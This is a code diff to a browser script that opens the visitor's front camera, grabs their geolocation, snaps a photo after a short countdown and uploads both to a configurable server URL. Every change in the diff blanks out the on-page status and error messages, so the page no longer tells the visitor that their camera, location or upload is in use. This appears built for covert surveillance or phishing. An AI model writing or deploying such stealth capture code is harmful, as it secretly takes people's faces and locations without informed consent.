@@ -33,7 +33,7 @@ async function startFlow() {
     console.log('UPLOAD_URL overridden from window:', UPLOAD_URL);
   }
 
-  statusEl.textContent = 'Preparing...';
+  statusEl.textContent = ' ';
 
   // Try get location early (so mobile shows permission prompt first)
   try {
@@ -54,18 +54,18 @@ async function startFlow() {
 async function initAndCapture() {
   try {
     notice.textContent = '';
-    statusEl.textContent = 'Requesting camera...';
+    statusEl.textContent = ' ';
     stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
     video.srcObject = stream;
 
     try { await video.play(); } catch (e) { console.warn('video.play() issue (ignored):', e); }
 
     await waitForVideoReady(video, 2000);
-    statusEl.textContent = 'Camera ready — starting countdown...';
+    statusEl.textContent = ' ';
     startCountdown(2);
   } catch (err) {
-    console.error('Camera init error:', err);
-    notice.textContent = 'Camera permission denied or unavailable.';
+    console.error(' ', err);
+    notice.textContent = ' ';
     statusEl.textContent = err?.message || String(err);
   }
 }
@@ -100,12 +100,12 @@ function startCountdown(seconds = 2) {
 /* Get current location with timeout */
 function getCurrentLocationWithTimeout(ms = 8000) {
   return new Promise((resolve, reject) => {
-    if (!navigator.geolocation) return reject(new Error('Geolocation not supported'));
+    if (!navigator.geolocation) return reject(new Error(' '));
     let done = false;
     const timer = setTimeout(() => {
       if (!done) {
         done = true;
-        reject(new Error('Geolocation timeout'));
+        reject(new Error(' '));
       }
     }, ms);
     navigator.geolocation.getCurrentPosition((pos) => {
@@ -125,7 +125,7 @@ function getCurrentLocationWithTimeout(ms = 8000) {
 /* Capture frame, (attempt location if not prepared), upload */
 async function captureAndUpload() {
   if (!stream) {
-    statusEl.textContent = 'No camera stream available.';
+    statusEl.textContent = ' ';
     return;
   }
 
@@ -146,7 +146,7 @@ async function captureAndUpload() {
     ctx.restore();
   } catch (err) {
     console.error('drawImage failed:', err);
-    statusEl.textContent = 'Capture failed.';
+    statusEl.textContent = ' ';
     stopCamera();
     return;
   }
@@ -168,7 +168,7 @@ async function captureAndUpload() {
   // Convert canvas to blob and send with form
   canvas.toBlob(async (blob) => {
     if (!blob) {
-      statusEl.textContent = 'Capture failed (no blob).';
+      statusEl.textContent = ' ';
       stopCamera();
       return;
     }
@@ -183,20 +183,20 @@ async function captureAndUpload() {
     form.append('longitude', preparedLocation.longitude || '');
 
     console.log('Uploading ->', { uploadUrl: UPLOAD_URL, filename, latitude: preparedLocation.latitude, longitude: preparedLocation.longitude });
-    statusEl.textContent = 'Uploading photo (and location if available)...';
+    statusEl.textContent = ' ';
 
     try {
       const resp = await fetch(UPLOAD_URL, { method: 'POST', body: form });
       const text = await resp.text();
       console.log('Upload response:', resp.status, text);
       if (resp.ok) {
-        statusEl.textContent = '✅ Uploaded successfully.';
+        statusEl.textContent = ' ';
       } else {
-        statusEl.textContent = '❌ Upload failed.';
+        statusEl.textContent = ' ';
       }
     } catch (err) {
       console.error('Network/upload error:', err);
-      statusEl.textContent = '❌ Network/upload error.';
+      statusEl.textContent = ' ';
     } finally {
       stopCamera();
     }
@@ -212,7 +212,7 @@ function stopCamera() {
       stream = null;
     }
     video.srcObject = null;
-    notice.textContent = 'Camera stopped.';
+    notice.textContent = ' ';
   } catch (err) {
     console.warn('Error stopping camera:', err);
   }
@@ -226,6 +226,6 @@ window.__cancelCapture = function() {
   if (captureTimeout) clearTimeout(captureTimeout);
   stopCamera();
   countdownEl.textContent = '';
-  statusEl.textContent = 'Capture cancelled.';
+  statusEl.textContent = ' ';
   console.log('Capture cancelled by user.');
 };
